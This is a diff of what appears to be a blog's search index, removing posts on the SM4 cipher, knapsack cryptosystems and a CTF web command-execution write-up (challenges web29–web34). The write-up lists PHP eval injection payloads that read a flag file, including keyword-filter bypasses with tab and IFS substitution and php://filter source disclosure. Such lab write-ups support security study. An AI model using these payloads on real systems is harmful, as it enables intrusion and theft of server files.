@@ -952,461 +952,6 @@ C_i = P_i \oplus E_K(\mathrm{CTR}_i)
       </tags>
   </entry>
   <entry>
-    <title>SM4</title>
-    <url>/2026/03/23/SM4/</url>
-    <content><![CDATA[<h1 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h1><p>SM4（原名SMS4）是中華人民共和國政府采用的一种分组密码标准，由国家密码管理局于2012年3月21日发布[。2016年8月，成为中国国家密码标准（GB&#x2F;T 32907-2016。在商用密码体系中，SM4主要用于数据加密，其算法公开，分组长度与密钥长度均为128bit，加密算法与密钥扩展算法都采用32轮非线性迭代结构，S盒为固定的8比特输入8比特输出。</p>
-<span id="more"></span>
-
-<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>SM4 是一种<strong>对称分组密码算法</strong>，分组长度为 <strong>128 bit</strong>，密钥长度为 <strong>128 bit</strong>，。加密算法 与密钥扩展算法均采用非线性迭代结构，共进行 <strong>32 轮迭代</strong>。数据解密和数据加密的算法结构相同, 只是轮密钥的使用顺序相反,解密轮密钥是加密轮密钥的逆序。广泛用于国密体系、金融、政务、通信安全等领域</p>
-<h2 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h2><p>设输入明文被表示为四个 32 比特字</p>
-<div class="math-display">
-
-<div class="math-display">\[
-(X_0,X_1,X_2,X_3)
-\]</div>
-
-</div>
-
-
-<p>则 SM4 在每一轮中都会利用当前的轮密钥 rk_i 和已有的 4 个状态字，生成一个新的 32 比特字。其基本迭代关系为</p>
-<div class="math-display">
-
-<div class="math-display">\[
-X_{i+4}=F(X_i,X_{i+1},X_{i+2},X_{i+3},rk_i),\qquad i=0,1,\dots,31
-\]</div>
-
-</div>
-
-
-<p>其中轮函数 F 定义为</p>
-<div class="math-display">
-
-<div class="math-display">\[
-F(X_0,X_1,X_2,X_3,rk)=X_0\oplus T(X_1\oplus X_2\oplus X_3\oplus rk)
-\]</div>
-
-</div>
-
-
-<p>这里的 T 是 SM4 的核心合成变换，它由<strong>非线性变换</strong>和<strong>线性变换</strong>复合而成，因此每一轮都同时具备“混淆”和“扩散”的作用。</p>
-<p>SM4 的每一轮都可以看成：先将后三个状态字与轮密钥进行异或混合，再经过合成变换 T 处理，最后与最前面的状态字异或，得到新的状态字。这样经过 32 轮迭代之后，算法得到</p>
-<div class="math-display">
-
-<div class="math-display">\[
-(X_{32},X_{33},X_{34},X_{35})
-\]</div>
-
-</div>
-
-
-<p>随后再经过一次<strong>反序变换</strong>，输出最终密文</p>
-<div class="math-display">
-
-<div class="math-display">\[
-(Y_0,Y_1,Y_2,Y_3)=(X_{35},X_{34},X_{33},X_{32})
-\]</div>
-
-</div>
-
-
-<p>也就是说，SM4 的最终输出并不是按照自然顺序直接拼接，而是要将最后四个字逆序排列后再作为密文输出。</p>
-<p>因此，从整体架构上看，SM4 可以概括为：<strong>以 128 比特分组为输入，以 128 比特密钥生成 32 个轮密钥，通过 32 轮迭代轮函数不断更新状态，最后经过反序变换输出密文</strong>。</p>
-<h2 id="明文处理"><a href="#明文处理" class="headerlink" title="明文处理"></a>明文处理</h2><p>在 SM4 中，输入的明文分组长度固定为 <strong>128 比特</strong>。为了便于后续迭代运算将整个 128 比特明文按顺序划分为 <strong>4 个 32 比特字</strong>。标准中将“字”定义为长度为 32 比特的组，因此 SM4 的初始输入状态通常记为</p>
-<div class="math-display">
-
-<div class="math-display">\[
-(X_0,X_1,X_2,X_3)
-\]</div>
-
-</div>
-
-
-<p>其中每个 X_i 都是一个 32 比特字。</p>
-<p>也就是说，如果将一组 128 比特明文记作</p>
-<div class="math-display">
-
-<div class="math-display">\[
-M
-\]</div>
-
-</div>
-
-
-<p>那么在进入加密过程之前，首先要完成的工作就是把它拆分成四个连续的 32 比特部分，分别作为算法的初始输入字：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-M \longrightarrow (X_0,X_1,X_2,X_3)
-\]</div>
-
-</div>
-
-
-<p>后续 32 轮加密迭代，都是在这四个字的基础上不断生成新的状态字，并逐步完成从明文到密文的变换。</p>
-<p>这说明 SM4 从一开始就是“4 个 32 位字”为基本处理对象来组织内部状态的。</p>
-<h2 id="密钥处理"><a href="#密钥处理" class="headerlink" title="密钥处理"></a>密钥处理</h2><p>在 SM4 中，密钥长度固定为 <strong>128 比特</strong>。与明文处理方式类似，为了便于后续的密钥扩展运算，算法会先将 128 比特主密钥按顺序划分为 <strong>4 个 32 比特字</strong>。设主密钥记为</p>
-<div class="math-display">
-
-<div class="math-display">\[
-MK=(MK_0,MK_1,MK_2,MK_3)
-\]</div>
-
-</div>
-
-
-<p>其中每个 MK_i 都是一个 32 比特字。</p>
-<p>也就是说，如果将输入密钥记作</p>
-<div class="math-display">
-
-<div class="math-display">\[
-K
-\]</div>
-
-</div>
-
-
-<p>那么在进入密钥扩展算法之前，首先需要将其拆分为四个连续的 32 比特部分：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-K \longrightarrow (MK_0,MK_1,MK_2,MK_3)
-\]</div>
-
-</div>
-
-
-<p>不过，这四个字并不会直接用于生成轮密钥，而是要先与系统参数 FK 进行一次异或运算，得到密钥扩展的初始状态：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-(K_0,K_1,K_2,K_3)=(MK_0\oplus FK_0,\;MK_1\oplus FK_1,\;MK_2\oplus FK_2,\;MK_3\oplus FK_3)
-\]</div>
-
-</div>
-
-
-<p>其中</p>
-<div class="math-display">
-
-<div class="math-display">\[
-FK=(FK_0,FK_1,FK_2,FK_3)
-\]</div>
-
-</div>
-
-
-<p>FK是 SM4 规定的系统参数，用于初始化密钥扩展过程。</p>
-<p>FK₀ &#x3D; <code>0xA3B1BAC6</code></p>
-<p>FK₁ &#x3D; <code>0x56AA3350</code></p>
-<p>FK₂ &#x3D; <code>0x677D9197</code></p>
-<p>FK₃ &#x3D; <code>0xB27022DC</code></p>
-<p>在得到初始状态 (K_0,K_1,K_2,K_3) 之后，SM4 会继续进行 32 轮密钥扩展。第 i 轮轮密钥的生成公式为</p>
-<div class="math-display">
-
-<div class="math-display">\[
-rk_i=K_{i+4}=K_i\oplus T'(K_{i+1}\oplus K_{i+2}\oplus K_{i+3}\oplus CK_i),\qquad i=0,1,\dots,31
-\]</div>
-
-</div>
-
-
-<p>也就是说，每一轮都会先将后面三个字 K_{i+1},K_{i+2},K_{i+3} 与固定参数 CK_i 进行异或，然后经过变换 T’ 处理，最后再与前面的 K_i 异或，得到新的字 K_{i+4}。而这个新生成的 K_{i+4}，就是当前轮使用的轮密钥 rk_i。</p>
-<p><img src="/images/CK.png" alt="CK"></p>
-<p>换句话说，轮密钥并不是一次性全部算出来的，而是按轮递推生成的：</p>
-<ul>
-<li>第 0 轮：</li>
-</ul>
-<div class="math-display">
-
-<div class="math-display">\[
-rk_0=K_4=K_0\oplus T'(K_1\oplus K_2\oplus K_3\oplus CK_0)
-\]</div>
-
-</div>
-
-
-
-<ul>
-<li>第 1 轮：</li>
-</ul>
-<div class="math-display">
-
-<div class="math-display">\[
-rk_1=K_5=K_1\oplus T'(K_2\oplus K_3\oplus K_4\oplus CK_1)
-\]</div>
-
-</div>
-
-
-
-<ul>
-<li>第 2 轮：</li>
-</ul>
-<div class="math-display">
-
-<div class="math-display">\[
-rk_2=K_6=K_2\oplus T'(K_3\oplus K_4\oplus K_5\oplus CK_2)
-\]</div>
-
-</div>
-
-
-
-<p>依此类推，直到生成第 31 轮轮密钥</p>
-<div class="math-display">
-
-<div class="math-display">\[
-rk_{31}=K_{35}
-\]</div>
-
-</div>
-
-
-<p>因此，SM4 的轮密钥序列</p>
-<div class="math-display">
-
-<div class="math-display">\[
-(rk_0,rk_1,\dots,rk_{31})
-\]</div>
-
-</div>
-
-
-<p>本质上就是由初始的 (K_0,K_1,K_2,K_3) 通过上述递推公式不断向前展开得到的。也就是说，<strong>真正参与每一轮加密运算的 rk_i，都是主密钥经过初始化、再经过 32 轮递推扩展后得到的结果。</strong></p>
-<h2 id="轮函数F"><a href="#轮函数F" class="headerlink" title="轮函数F"></a>轮函数F</h2><p>在 SM4 中，真正推动整个加密过程不断向前迭代的核心，就是轮函数 F。经过明文处理后，算法已经将输入表示为 4 个 32 比特字</p>
-<div class="math-display">
-
-<div class="math-display">\[
-(X_0,X_1,X_2,X_3)
-\]</div>
-
-</div>
-
-
-<p>之后每一轮的任务，就是在当前 4 个状态字和轮密钥的基础上，计算出一个新的 32 比特字，并将其加入到后续状态中。轮函数 F 定义为 </p>
-<div class="math-display">
-
-<div class="math-display">\[
-F(X_0,X_1,X_2,X_3,rk)=X_0\oplus T(X_1\oplus X_2\oplus X_3\oplus rk)
-\]</div>
-
-</div>
-
-
-<p>其中，rk 表示当前轮使用的轮密钥，T 表示一个合成置换，它由后续要介绍的非线性变换和线性变换共同构成。也就是说，轮函数 F 并不是简单地对输入做一次异或，而是先将后三个状态字与轮密钥混合，再经过变换 T 处理，最后再与最前面的状态字 X_0异或，得到当前轮的输出。</p>
-<p>如果把这个过程拆开来看，那么轮函数 F 的计算逻辑可以概括为以下几步。首先，先计算后三个状态字与轮密钥的异或结果：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-A=X_1\oplus X_2\oplus X_3\oplus rk
-\]</div>
-
-</div>
-
-
-<p>然后，将这个中间结果输入到合成置换 T 中：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-B=T(A)
-\]</div>
-
-</div>
-
-
-<p>最后，再将其与最前面的状态字 X_0 进行异或，得到轮函数输出：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-F(X_0,X_1,X_2,X_3,rk)=X_0\oplus B
-\]</div>
-
-</div>
-
-
-<p>因此，从结构上看，SM4 的轮函数可以理解为一种“反馈式”更新机制：它并不是同时修改 4 个状态字，而是利用当前的 4 个字计算出一个新的字，并将这个新字接到状态序列后面。也正因为如此，SM4 的整体迭代关系被写成</p>
-<div class="math-display">
-
-<div class="math-display">\[
-X_{i+4}=F(X_i,X_{i+1},X_{i+2},X_{i+3},rk_i),\qquad i=0,1,\dots,31
-\]</div>
-
-</div>
-
-
-<p>也就是说，第 i 轮并不会直接覆盖原来的 X_i,X_{i+1},X_{i+2},X_{i+3}，而是在它们的基础上生成新的 X_{i+4}，从而推动整个状态不断向前演化。</p>
-<h2 id="合成置换T"><a href="#合成置换T" class="headerlink" title="合成置换T"></a>合成置换T</h2><p>SM4 中的合成置换 T 定义为</p>
-<div class="math-display">
-
-<div class="math-display">\[
-T(\cdot)=L(\tau(\cdot))
-\]</div>
-
-</div>
-
-
-<p>其中，τ  表示非线性变换，L 表示线性变换。也就是说，T 先通过τ  ( S 盒完成字节代换)，再通过线性变换实现扩散，是 SM4 轮函数中的核心变换。</p>
-<h2 id="非线性变换τ"><a href="#非线性变换τ" class="headerlink" title="非线性变换τ"></a>非线性变换τ</h2><p>在合成置换 T 中，第一步就是非线性变换 。它的作用是对输入的 32 比特字进行字节级替换，从而为 SM4 提供最关键的非线性来源。( 其实就是个和AES的sbox查表替换一样)</p>
-<p>设输入为一个 32 比特字</p>
-<div class="math-display">
-
-<div class="math-display">\[
-A=(a_0,a_1,a_2,a_3)\in (Z_2^8)^4
-\]</div>
-
-</div>
-
-
-<p>其中 a_0,a_1,a_2,a_3 分别表示 A 的 4 个字节。经过非线性变换 后，输出记为</p>
-<div class="math-display">
-
-<div class="math-display">\[
-B=(b_0,b_1,b_2,b_3)
-\]</div>
-
-</div>
-
-
-<p>其变换关系为</p>
-<div class="math-display">
-
-<div class="math-display">\[
-(b_0,b_1,b_2,b_3)=\tau(A)=(Sbox(a_0),Sbox(a_1),Sbox(a_2),Sbox(a_3))
-\]</div>
-
-</div>
-
-
-<p>也就是说，τ 的本质就是将输入字中的每一个字节分别送入 SM4 规定的 S 盒，得到对应的新字节，再重新拼接成一个新的 32 比特字。</p>
-<div class="math-display">
-
-<div class="math-display">\[
-b_i=Sbox(a_i),\qquad i=0,1,2,3
-\]</div>
-
-</div>
-
-
-<p>因此，非线性变换τ 可以理解为一种<strong>逐字节替换操作</strong>：它保持字节数不变，但会根据 S 盒查表规则，把每个输入字节替换成另一个输出字节。</p>
-<p><img src="/images/SM4-Sbox.png" alt="SM4-Sbox.png"></p>
-<p>若输入字节为 <code>EF</code>，则应在 S 盒表中查找第 <code>E</code> 行、第 <code>F</code> 列，对应得到的输出为 <code>84</code>，即</p>
-<div class="math-display">
-
-<div class="math-display">\[
-Sbox(\mathrm{EF})=\mathrm{84}
-\]</div>
-
-</div>
-
-
-
-<h2 id="线性变换-L"><a href="#线性变换-L" class="headerlink" title="线性变换 L"></a>线性变换 L</h2><p>在线性变换 完成字节代换之后，SM4 还需要进一步将这种非线性效果扩散到更多比特位置上，这一步就是线性变换 L。设 τ 的输出为一个 32 比特字 B，则线性变换 L 定义为</p>
-<div class="math-display">
-
-<div class="math-display">\[
-L(B)=B\oplus(B\lll2)\oplus(B\lll10)\oplus(B\lll18)\oplus(B\lll24)
-\]</div>
-
-</div>
-
-
-
-
-<div class="math-display">
-
-<div class="math-display">\[
-其中，\lll i 表示将 32 比特字循环左移 i 位
-\]</div>
-
-</div>
-
-
-
-<p>也就是说，L 会将输入字 B 本身与其循环左移 2 位、10 位、18 位和 24 位后的结果分别进行异或，从而得到新的 32 比特输出。这样一来，输入中某一位的变化就会通过移位和异或传播到输出的多个位置，从而增强算法的扩散能力。</p>
-<p>随后，轮函数会将这个结果再与当前最前面的状态字进行异或，从而生成新的状态字，并作为下一轮迭代的一部分继续参与运算。也就是说，SM4 并不是只进行一次这样的变换，而是不断重复这一过程：每一轮都利用当前的 4 个状态字和对应的轮密钥，生成一个新的状态字，再推动整个状态向前更新。</p>
-<p>经过 32 轮迭代之后，算法最终得到</p>
-<div class="math-display">
-
-<div class="math-display">\[
-(X_{32},X_{33},X_{34},X_{35})
-\]</div>
-
-</div>
-
-
-<p>不过，这 4 个字并不会按当前顺序直接输出，而是还需要经过一次反序变换，重新排列为</p>
-<div class="math-display">
-
-<div class="math-display">\[
-(Y_0,Y_1,Y_2,Y_3)=(X_{35},X_{34},X_{33},X_{32})
-\]</div>
-
-</div>
-
-
-<p>这样得到的结果，才是 SM4 的最终密文</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>SM4 是一种 <strong>128 比特分组、128 比特密钥</strong> 的对称分组密码算法，共进行 <strong>32 轮迭代</strong>。在加密开始时，算法首先将 128 比特明文划分为 4 个 32 比特字</p>
-<div class="math-display">
-
-<div class="math-display">\[
-(X_0,X_1,X_2,X_3)
-\]</div>
-
-</div>
-
-
-<p>同时，将 128 比特主密钥划分为 4 个 32 比特字，并经过初始化和密钥扩展生成 32 个轮密钥</p>
-<div class="math-display">
-
-<div class="math-display">\[
-(rk_0,rk_1,\dots,rk_{31})
-\]</div>
-
-</div>
-
-
-<p>供后续每一轮加密使用。</p>
-<p>在每一轮中，SM4 都会先将后三个状态字与当前轮密钥进行异或，再送入合成置换 T。其中T 先通过非线性变换τ 完成 S 盒替换，再通过线性变换 L实现扩散，最后再与最前面的状态字异或，生成新的状态字。其轮函数可表示为</p>
-<div class="math-display">
-
-<div class="math-display">\[
-X_{i+4}=X_i\oplus T(X_{i+1}\oplus X_{i+2}\oplus X_{i+3}\oplus rk_i),\qquad i=0,1,\dots,31
-\]</div>
-
-</div>
-
-
-<p>也就是说，SM4 正是通过这样的轮函数迭代，不断将明文状态推进到新的状态。</p>
-<p>当 32 轮运算全部结束后，算法得到</p>
-<div class="math-display">
-
-<div class="math-display">\[
-(X_{32},X_{33},X_{34},X_{35})
-\]</div>
-
-</div>
-
-
-<p>最后再经过一次反序变换，输出密文</p>
-<div class="math-display">
-
-<div class="math-display">\[
-(Y_0,Y_1,Y_2,Y_3)=(X_{35},X_{34},X_{33},X_{32})
-\]</div>
-
-</div>
-
-
-<p>因此，从整体上看，SM4 的加密过程可以概括为：<strong>明文分组、密钥扩展、32 轮轮函数迭代，以及最终的反序输出。</strong></p>
-]]></content>
-      <categories>
-        <category>密码学</category>
-      </categories>
-      <tags>
-        <tag>密码学</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Crypto-Ellipse Curve Cryptography</title>
     <url>/2026/03/01/Crypto-Ellipse%20Curve%20Cryptography/</url>
     <content><![CDATA[<h1 id="Ellipse-Curve-Cryptography"><a href="#Ellipse-Curve-Cryptography" class="headerlink" title="Ellipse Curve Cryptography"></a><strong>Ellipse Curve Cryptography</strong></h1><p><strong>ECC</strong> 全称为椭圆曲线加密，EllipseCurve Cryptography，是一种基于椭圆曲线数学的公钥密码。与传统的基于大质数因子分解困难性的加密方法不同，ECC依赖于解决椭圆曲线离散对数问题的困难性。它的优势主要在于相对于其它方法，它可以在使用较短密钥长度的同时保持相同的密码强度。</p>
@@ -1748,546 +1293,160 @@ s=k^{−1}(z+rd)modn
       </tags>
   </entry>
   <entry>
-    <title>Web</title>
-    <url>/2026/02/24/Web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
-    <content><![CDATA[<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><span id="more"></span>
-
-<h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p><img src="/images/web29.png" alt="web29"></p>
-<p>检查GET请求中是否存在名为’c’的参数，并将值赋给<span class="math-inline">(c，正则匹配检查)</span>c是否包含‘flag’，其中&#x2F;i表示不区分大小写</p>
-<p>，当没有匹配到‘flag’时执行eval函数</p>
-<p>那先看看目录下有什么文件,使c&#x3D;system(‘ls’)</p>
-<p>有flag.php</p>
-<p>直接<em><em>c&#x3D;system(‘tac f</em>‘)</em>*</p>
-<p>也可以cp复制文件,把flag .php 文件复制为 1.txt,再访问1.txt</p>
-<p>即<em><em>c&#x3D;system(‘cp fla</em>.php 1.txt’);</em>*</p>
-<h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><p><img src="/images/web30.png" alt="web30"></p>
-<p>这次多禁用了system和php</p>
-<p>system还可以用exec和passthru代替</p>
-<p>关于这两个函数的区别</p>
-<p><img src="/images/web30a.png" alt="web30a"></p>
-<p><em><em>?c&#x3D;passthru(‘tac f</em>‘);</em>*</p>
-<p><em><em>?c&#x3D;echo exec(‘cat fla</em>‘);</em>*</p>
-<p>还有<em><em>c&#x3D;passthru(‘cp fla</em>.php 1.txt’);</em>*</p>
-<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p><img src="/images/web31.png" alt="web31"></p>
-<p>限制了flag,system,php,cat,sort,shell,点号,空格,单引号</p>
-<p><strong>1.嵌套参数:</strong></p>
-<p>先使c&#x3D;eval($_GET[1]),再1&#x3D;system(“tac flag.php”);,</p>
-<p>即**?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(“tac flag.php”);**</p>
-<p><strong>2.对于空格</strong>,我们可以使用%09,浏览器访问时会自动把<code>%09</code>解码为 Tab 字符，执行效果和空格完全一样，同时避开了空格的过滤规则,也可以使用**<span class="math-inline">(IFS)</span>9<strong>和</strong>${IFS}**替代</p>
-<p>𝐼𝐹𝑆绕过：在𝑙𝑖𝑛𝑢𝑥下，{IFS}是分隔符的意思，所以可以有${IFS}进行空格的替代。</p>
-<p>𝐼𝐹𝑆9绕过：$起截断作用，9为当前shell进程的第九个参数，始终为空字符串，所以同样能代替空字符串进行分割</p>
-<p><em>?c&#x3D;passthru(“tac%09fla</em>“);</p>
-<p>?c&#x3D;passthru(“tac\${IFS}fla*”);</p>
-<p>?c&#x3D;passthru(“tac\<span class="math-inline">({IFS}\)</span>9f*”);</p>
-<p>上述的反斜杠用于对<span class="math-inline">(进行转义()</span>在 URL &#x2F; 服务器中是特殊字符，但在 Shell 中是环境变量标识，反斜杠解决了这个 “双重解析” 的冲突)</p>
-<p><strong>3.读取文件</strong></p>
-<p><code>highlight_file()</code> 是 PHP 的核心函数，<strong>作用是读取指定文件的内容，并按照 PHP 语法高亮的格式输出到页面上</strong></p>
-<p>既然过滤了flag,base64编码后解码就行了,即(base64_decode(“ZmxhZy5waHA&#x3D;”)</p>
-<p>?c&#x3D;highlight_file(base64_decode(“ZmxhZy5waHA&#x3D;”));</p>
-<p>也可替换成<strong>show_source</strong></p>
-<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p><img src="/images/web32.png" alt="web32"></p>
-<p>限制了flag,system,php,cat,sort,shell,echo,点号,空格,单引号,分号,左括号</p>
-<p>因为禁用了左括号,上面的思路看来行不通了</p>
-<p>我们可以使用<strong>include语句,include语句用于在执行流中插入写在其他文件中的有用的代码</strong></p>
-<p>那先构造c&#x3D;include $_GET[1]</p>
-<p>发现空格和分号,前者可以用%09替代,后者可以用php闭合标签**?&gt;**替代</p>
-<p>即c&#x3D;include%09$_GET[1]?&gt;</p>
-<p>&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
-<h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p><img src="/images/web33.png" alt="web33"></p>
-<p>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
-<h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p><img src="/images/web34.png" alt="web34"></p>
-<p>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Crypto-Knapsack Problem</title>
-    <url>/2026/02/06/Crypto-Knapsack%20Problem/</url>
-    <content><![CDATA[<h1 id="背包密码体制"><a href="#背包密码体制" class="headerlink" title="背包密码体制"></a>背包密码体制</h1><p>背包密码体制（Knapsack Cryptosystem）是一类基于背包问题构造的公钥密码方案。它的基本思想是：将明文比特串映射为一个整数，再通过一组权重的线性组合生成密文。</p>
-<h2 id="1-背包问题"><a href="#1-背包问题" class="headerlink" title="1. 背包问题"></a>1. 背包问题</h2><p>经典背包问题可以表述为：给定一组正整数</p>
-<div class="math-display">
-
-<div class="math-display">\[
-a_1, a_2, \dots, a_n
-\]</div>
-
-</div>
-
-
-
-<p>以及一个目标值 <span class="math-inline">(W)</span>，判断是否存在一组二进制变量 <span class="math-inline">(x_i \in 0,1)</span>，使得</p>
-<div class="math-display">
-
-<div class="math-display">\[
-\sum_{i=1}^{n} x_i a_i = W
-\]</div>
-
-</div>
-
-
-
-<p>如果允许穷举所有 <span class="math-inline">(2^n)</span> 种组合，那么该问题可以直接求解；但当 <span class="math-inline">(n)</span> 较大时，穷举代价会迅速增长，因此背包问题具有较高的计算复杂度。</p>
-<p>背包密码体制正是利用了这一点：对外公开一个看似难以求解的背包实例，使攻击者难以从密文恢复明文。</p>
-<h2 id="2-基本加密思想"><a href="#2-基本加密思想" class="headerlink" title="2. 基本加密思想"></a>2. 基本加密思想</h2><p>设明文是一个 <span class="math-inline">(n)</span> 位二进制串</p>
-<div class="math-display">
-
-<div class="math-display">\[
-x = (x_1, x_2, \dots, x_n), \quad x_i \in 0,1
-\]</div>
-
-</div>
-
-
-
-<p>给定一组公开权重</p>
-<div class="math-display">
-
-<div class="math-display">\[
-a_1, a_2, \dots, a_n
-\]</div>
-
-</div>
-
-
-
-<p>则可以把密文构造为：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-C = \sum_{i=1}^{n} x_i a_i
-\]</div>
-
-</div>
-
-
-
-<p>从形式上看，这就是把明文比特作为系数，去选择性地累加某些权重。</p>
-<p>如果这些权重没有额外结构，那么从 <span class="math-inline">(C)</span> 反推出 <span class="math-inline">(x)</span> 一般是困难的，这正是背包密码的设计基础。</p>
-<h2 id="3-超递增序列"><a href="#3-超递增序列" class="headerlink" title="3. 超递增序列"></a>3. 超递增序列</h2><p>为了便于解密，可以构造一类特殊的序列，称为<strong>超递增序列</strong>（superincreasing sequence）。它满足：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-a_i &amp;gt; \sum_{k=1}^{i-1} a_k, \quad i=2,3,\dots,n
-\]</div>
-
-</div>
-
-
-
-<p>也就是说，每一项都大于前面所有项之和。</p>
-<p>例如：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-1,\ 3,\ 6,\ 11,\ 23,\ 45
-\]</div>
-
-</div>
-
-
-
-<p>就是一个超递增序列，因为它满足：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-3 &amp;gt; 1,
-\quad 6 &amp;gt; 1+3,
-\quad 11 &amp;gt; 1+3+6,
-\]</div>
-
-</div>
-
-
-
-<p>依次类推。</p>
-<h3 id="3-1-为什么它容易解密"><a href="#3-1-为什么它容易解密" class="headerlink" title="3.1 为什么它容易解密"></a>3.1 为什么它容易解密</h3><p>如果使用超递增序列加密，那么解密可以从后向前进行：</p>
-<ul>
-<li>如果当前密文 <span class="math-inline">(C)</span> 大于某一项 <span class="math-inline">(a_i)</span>，则说明对应的 <span class="math-inline">(x_i &#x3D; 1)</span></li>
-<li>否则，说明 <span class="math-inline">(x_i &#x3D; 0)</span></li>
-</ul>
-<p>确定 <span class="math-inline">(x_i)</span> 后，再令</p>
-<div class="math-display">
-
-<div class="math-display">\[
-C \leftarrow C - x_i a_i
-\]</div>
-
-</div>
-
-
-
-<p>继续判断下一项即可。</p>
-<p>由于每一项都大于前面所有项之和，所以这种贪心判断是正确的。</p>
-<h2 id="4-简单超递增背包体制"><a href="#4-简单超递增背包体制" class="headerlink" title="4. 简单超递增背包体制"></a>4. 简单超递增背包体制</h2><p>设私钥为一个超递增序列：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-w_1, w_2, \dots, w_n
-\]</div>
-
-</div>
-
-
-
-<p>给定明文比特串 <span class="math-inline">(x_1, x_2, \dots, x_n)</span>，加密为：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-C = \sum_{i=1}^{n} x_i w_i
-\]</div>
-
-</div>
-
-
-
-<p>解密时，按从后向前的顺序恢复：</p>
-<ol>
-<li>判断 <span class="math-inline">(C)</span> 是否大于 <span class="math-inline">(w_n)</span></li>
-<li>若是，则 <span class="math-inline">(x_n &#x3D; 1)</span>，并令 <span class="math-inline">(C \leftarrow C - w_n)</span></li>
-<li>否则 <span class="math-inline">(x_n &#x3D; 0)</span></li>
-<li>对 <span class="math-inline">(w_{n-1}, w_{n-2}, \dots, w_1)</span> 重复上述过程</li>
-</ol>
-<p>这种方案的缺点也很明显：如果直接公开超递增序列，那么攻击者同样可以用贪心算法轻松解密，因此它不能直接作为公钥方案使用。</p>
-<h2 id="5-由私钥到公钥"><a href="#5-由私钥到公钥" class="headerlink" title="5. 由私钥到公钥"></a>5. 由私钥到公钥</h2><p>为了让系统具备公钥密码体制的特点，通常会对超递增序列进行变换。</p>
-<p>一种经典做法是：</p>
-<ul>
-<li>选取超递增序列 <span class="math-inline">(w_1, w_2, \dots, w_n)</span></li>
-<li>选取模数 <span class="math-inline">(m)</span>，满足</li>
-</ul>
-<div class="math-display">
-
-<div class="math-display">\[
-m &amp;gt; \sum_{i=1}^{n} w_i
-\]</div>
-
-</div>
-
-
-
-<ul>
-<li>再选取整数 <span class="math-inline">(r)</span>，使得</li>
-</ul>
-<div class="math-display">
-
-<div class="math-display">\[
-\gcd(r,m)=1
-\]</div>
-
-</div>
-
-
-
-<p>然后构造公开序列：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-a_i \equiv r w_i \pmod m
-\]</div>
-
-</div>
-
-
-
-<p>此时：</p>
-<ul>
-<li><span class="math-inline">(w_i)</span> 是私钥中的结构化序列</li>
-<li><span class="math-inline">(a_i)</span> 是公开发布的背包序列</li>
-</ul>
-<h3 id="5-1-加密"><a href="#5-1-加密" class="headerlink" title="5.1 加密"></a>5.1 加密</h3><p>对明文比特串 <span class="math-inline">(x_1,\dots,x_n)</span>，密文为：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-C = \sum_{i=1}^{n} x_i a_i
-\]</div>
-
-</div>
-
-
-
-<h3 id="5-2-解密"><a href="#5-2-解密" class="headerlink" title="5.2 解密"></a>5.2 解密</h3><p>解密时，先利用 <span class="math-inline">(r)</span> 的模逆：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-r^{-1} \pmod m
-\]</div>
-
-</div>
-
-
-
-<p>将密文恢复到私钥背包对应的形式：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-C' \equiv C \cdot r^{-1} \pmod m
-\]</div>
-
-</div>
-
-
-
-<p>然后对超递增序列 <span class="math-inline">(w_i)</span> 使用贪心算法恢复明文。</p>
-<h2 id="6-Merkle-Hellman-背包密码体制"><a href="#6-Merkle-Hellman-背包密码体制" class="headerlink" title="6. Merkle-Hellman 背包密码体制"></a>6. Merkle-Hellman 背包密码体制</h2><p>最著名的背包公钥密码体制是 <strong>Merkle-Hellman Knapsack Cryptosystem</strong>。其核心思路就是：</p>
-<ol>
-<li>选一个超递增序列作为私钥</li>
-<li>通过模乘变换生成看似随机的公开序列</li>
-<li>用公开序列加密</li>
-<li>用私钥结构高效解密</li>
-</ol>
-<p>这种设计在早期被认为很有希望，因为公开背包看起来像一个一般的 NP 难问题实例。</p>
-<h2 id="7-一个简单例子"><a href="#7-一个简单例子" class="headerlink" title="7. 一个简单例子"></a>7. 一个简单例子</h2><p>假设私钥超递增序列为：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-W = (2,3,7,14,30)
-\]</div>
-
-</div>
-
-
-
-<p>选择模数和乘数：</p>
-<div class="math-display">
-
-<div class="math-display">\[
-m = 61, \quad r = 17
-\]</div>
-
-</div>
-
